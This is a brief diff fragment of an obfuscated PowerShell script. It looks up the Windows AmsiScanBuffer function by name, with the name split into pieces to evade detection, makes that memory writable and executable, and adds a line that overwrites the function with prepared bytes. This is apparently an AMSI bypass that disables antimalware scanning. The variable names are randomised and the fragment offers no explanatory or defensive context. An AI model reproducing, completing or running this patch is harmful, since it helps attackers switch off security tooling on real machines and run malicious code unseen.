@@ -42,5 +42,6 @@ $npmjpz = [afrcv]::GetProcAddress($wzqprfk, "A"+"m"+"si" + "S"+"c"+"an" + "Bu"+"
 [afrcv]::VirtualProtect($npmjpz, [uint32]5, 0x40,[ref]$p)
 
 $acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
+$7amada::Copy($acyyr, 0, $npmjpz, 6)
 
 
